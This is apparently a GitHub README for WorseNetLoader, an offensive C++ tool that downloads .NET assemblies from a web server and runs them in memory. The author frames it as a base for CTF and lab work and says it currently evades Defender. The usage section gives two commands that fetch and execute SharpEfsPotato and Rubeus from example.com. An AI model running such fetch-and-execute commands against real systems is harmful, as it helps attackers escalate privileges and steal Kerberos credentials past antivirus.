# WorseNetLoader
C++ program that downloads and executes a .NET assembly inline and in memory, with no real evasion or shiny things added.

I created this project to be a base that I can clone and add features to as needed by my team. Currently it doesn't feature any sort of AMSI or ETW or whatever bypasses, but I can add them in fairly easily and create versions of this program to share during CTFs or labs that have defender(or other AV) running. Is it the best code? No, but it is functional. Currently not detected by defender, but it probably will be soon. Though, without any packaged bypass techniques your payload will probably be detected anyway.

### Usage:
Host the assembly you want to use on a web server and use the loader to download into memory and execute
```powershell
.\WorseNetLoader.exe /p:http://example.com/SharpEfsPotato.exe /a:'-p calc.exe'
.\WorseNetLoader.exe /p:http://example.com/Rubeus.exe /a:'monitor /interval:3'
```

Sources and inspiration:

https://github.com/racoten/BetterNetLoader

https://github.com/Adaptix-Framework/Extension-Kit/tree/main/Execution-BOF

https://github.com/Flangvik/NetLoader
